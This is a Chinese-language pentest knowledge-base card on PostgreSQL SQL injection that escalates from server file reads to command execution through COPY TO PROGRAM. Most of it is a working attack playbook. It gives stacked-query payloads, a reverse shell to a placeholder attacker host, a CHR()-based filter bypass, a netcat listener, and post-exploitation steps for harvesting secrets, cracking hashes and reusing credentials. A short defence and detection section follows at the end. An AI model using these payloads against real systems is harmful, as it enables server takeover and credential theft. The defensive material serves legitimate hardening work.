---
id: web-generic-sqli-postgres-copy-to-program-rce
title: PostgreSQL SQL 注入：pg_read_file/pg_ls_dir 读文件与 COPY TO PROGRAM 命令执行
type: scenario
domain: web
path: web/generic/sqli
technique: postgres-sqli-copy-to-program
tags:
- sqli
- postgresql
- stacked-query
- copy-to-program
- rce
- file-read
- pg-read-file
- flask
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V76
  verified_at: '2026-11-05T16:31:57+08:00'
  notes: 已对照原文与 img/01-46 核对：img/22 version() 返回 PostgreSQL 15.10；img/16 pg_read_file 读到 /etc/passwd，img/15 pg_ls_dir 列 /etc；img/18 COPY TO PROGRAM 报错回显，img/17 nc 收到 postgres Shell（uid=102）；img/25-31 后利用读 config.py、日志哈希、PGP 备份与 /etc/hosts。原文仅给环境版本 15.10，非受影响区间，未设置 affected_versions。PoC 未执行。frontmatter 无 sources/source_url（按 worker brief 不写来源）。
url: /docs/web/generic/sqli/web-generic-sqli-postgres-copy-to-program-rce/
draft: false
kb_aliases:
- PostgreSQL COPY TO PROGRAM
- pg_read_file 注入
- pg_ls_dir
- 堆叠查询 Postgres RCE
- Postgres 注入命令执行
- Flask 搜索框 SQL 注入
---

## 一句话结论

PostgreSQL 应用的搜索/筛选参数被直接拼接进 SQL 时，若应用数据库账号具备超级用户或 `pg_read_server_files`/`pg_execute_server_program` 角色，攻击者可用堆叠查询调用 `pg_read_file`/`pg_ls_dir` 读取服务器文件，再用 `COPY ... TO PROGRAM` 以 postgres 操作系统用户执行任意命令并取得反弹 Shell。

## 原理

- PostgreSQL 的简单查询协议允许一次调用执行多条以 `;` 分隔的语句；许多驱动（如 psycopg2 的 `execute`）会把包含分号的字符串整体发给数据库。应用若把搜索词直接拼进 `WHERE ... LIKE '%<input>%'`，攻击者用 `'; SELECT ...--` 即可追加任意 SQL。
- `pg_read_file(path)` 返回服务器端文件文本，`pg_ls_dir(path)` 列出目录，`pg_read_binary_file` 读二进制；这些函数要求超级用户，或授予 `pg_read_server_files` 角色。
- `COPY (SELECT '') TO PROGRAM '<shell command>'` 会让 PostgreSQL 后端调用 `/bin/sh -c` 执行命令，进程身份是运行数据库的 OS 用户（常见为 `postgres`）；该功能要求超级用户或 `pg_execute_server_program` 角色。
- 有回显时结果直接渲染在业务页面（本例是分析仪表盘的表格/错误页）；无回显时可用 `COPY ... FROM PROGRAM 'id'` 写入临时表再查回，或用 `pg_sleep`、`dblink`、DNS 做盲外带。
- 为什么危害极高：数据库账号通常被授予过高权限，SQLi 因此从“读数据”升级为“服务器命令执行”；拿到 postgres Shell 后可读应用配置、日志与备份，进一步获取业务凭据并横向。
- 动态 SQL 与 `CHR()` 拼接常用于绕过关键字过滤：`DO $$ DECLARE c text; BEGIN c := CHR(67)||...; EXECUTE c; END $$;` 在服务端拼出 `COPY ... TO PROGRAM`，避免请求中出现完整关键字。

## 触发条件

- 存在拼接 SQL 的注入点（搜索框、排序、筛选参数等），且驱动/接口允许堆叠查询。
- 数据库账号为超级用户，或具备 `pg_read_server_files`/`pg_execute_server_program` 角色（默认安装脚本常把应用账号设为超级用户）。
- 注入结果或数据库错误可观测（有回显或可写临时表）。
- 数据库主机允许出网（反弹 Shell），或攻击者可利用可观测通道外带数据。
- 运行数据库的 OS 用户可执行 shell（Linux 常规部署）。

## 利用步骤

1. 确认注入与数据库类型：`'; SELECT version()--`，返回 `PostgreSQL 15.x` 一类版本串。
2. 读取文件验证权限：`'; SELECT pg_read_file('/etc/passwd')--`；列出目录：`'; SELECT * FROM pg_ls_dir('/etc')--`。
3. 确认当前账号权限：`'; SELECT current_user, rolsuper FROM pg_roles WHERE rolname = current_user--`；若不是超级用户，检查是否有 `pg_read_server_files`/`pg_execute_server_program`。
4. 启动监听并执行命令；若关键字被过滤，用 `DO` 块 + `CHR()` 拼接：
   ```sql
   '; DO $$ DECLARE c text; BEGIN
        c := 'COPY (SELECT '''') TO PROGRAM ''bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"''';
        EXECUTE c;
      END $$;--
   ```
5. 在监听端确认 `id` 为 `postgres`（或数据库运行用户）。
6. 后利用：读取应用配置（如 Flask 的 `config.py`、`.env`）获取 `DB_PASS`、`SECRET_KEY`、邮件/第三方凭据；检查 PostgreSQL 日志（`/var/log/postgresql/*.log` 及 `.gz`），日志可能记录包含密码哈希或明文的 `UPDATE`/`INSERT` 语句；检查备份目录（如 `.sql.gpg`），用数据库口令解密 PGP 备份。
7. 对拿到的 MD5/NTLM 等哈希做离线破解，再用明文尝试 Web 后台、SSH、域账号等处的口令复用。

## PoC

```sql
-- 版本与文件读取
'; SELECT version()--
'; SELECT pg_read_file('/etc/passwd')--
'; SELECT * FROM pg_ls_dir('/etc')--

-- 命令执行（要求 superuser 或 pg_execute_server_program）
'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"'--

-- 关键字被过滤时，用 DO + CHR() 动态拼接
'; DO $$ DECLARE c text; BEGIN
     c := CHR(67)||CHR(79)||CHR(80)||CHR(89)||' (SELECT '''') TO PROGRAM ''bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"''';
     EXECUTE c;
   END $$;--
```

```bash
# 攻击机监听
nc -lvnp 4444
# 连接后
id    # uid=102(postgres) gid=110(postgres)
```

## 变体与关联

- 变体：`COPY ... FROM PROGRAM 'id'` 把命令输出写入临时表再查回，适合无回显；`pg_read_binary_file`/`lo_import`/`lo_export` 读二进制与写文件。
- 变体：`dblink`/`postgres_fdw` 可做内网 SSRF 或跨库查询；`pg_sleep` 做时间盲注；`CAST`/类型错误做报错注入。
- 变体：应用仅允许单条语句时，改用 `UNION SELECT` 读取 `pg_read_file` 结果；或利用 `ORDER BY`/`LIKE` 注入点。
- 变体：数据库非超级用户但可读文件时，优先 dump 用户表与哈希，离线破解后复用；若可写目录，可尝试写 SSH `authorized_keys` 或 WebShell（需 `pg_write_file`/`COPY TO` 文件权限）。
- 关联：[[web-generic-sqli-error-based-extraction]]（报错注入基础）、[[web-generic-sqli-dnslog-oob-exfiltration]]（无回显外带）、[[web-generic-sqli-mysql-outfile-webshell]]（另一种数据库写文件思路）、[[pentest-privilege-escalation-credential-file-harvesting]]（数据库后利用的配置/历史凭据搜索）、[[pentest-privilege-escalation-postgresql-superuser-copy-from-program]]（已持有数据库超级用户凭据时的同类 COPY ... PROGRAM 路径，本卡侧重 Web SQL 注入入口与堆叠查询 payload）。
- 边界：数据库账号非超级用户且未授予文件/程序角色、驱动禁用多语句、数据库运行在无 shell 的受限容器、出网被阻断、或后端仅返回布尔值且无法外带时，`COPY TO PROGRAM` 不成立；文件读取也可能单独被 `pg_read_server_files` 限制。

## 检测与防御

- **根因修复**：所有 SQL 使用参数化查询/ORM 绑定变量，禁止字符串拼接；对排序字段做白名单映射。
- **最小权限**：应用数据库账号设置为 `NOSUPERUSER`，撤销 `pg_execute_server_program`、`pg_read_server_files` 等角色；不同应用使用独立账号。
- **禁用危险面**：在驱动层禁用多语句（如 psycopg2 使用 `execute` 单语句封装、检查分号），或在数据库侧通过审计/扩展限制 `COPY ... PROGRAM`。
- **错误处理**：关闭生产环境详细 SQL 错误回显，统一错误页；避免把数据库原始报错返回给前端。
- **网络与主机**：数据库主机限制出站连接，postgres 用户无交互 Shell、不可读应用源码与备份；备份加密密钥不与数据库口令同放一处。
- **检测**：PostgreSQL 日志出现 `COPY` + `PROGRAM`、`pg_read_file`、`pg_ls_dir`、`lo_import`、`dblink` 等关键字；Web 请求参数含 `;`、`$$`、`CHR(`、`pg_`；数据库进程派生 `bash`/`sh` 或连接外部 IP；异常大量 `pg_sleep` 或错误查询。

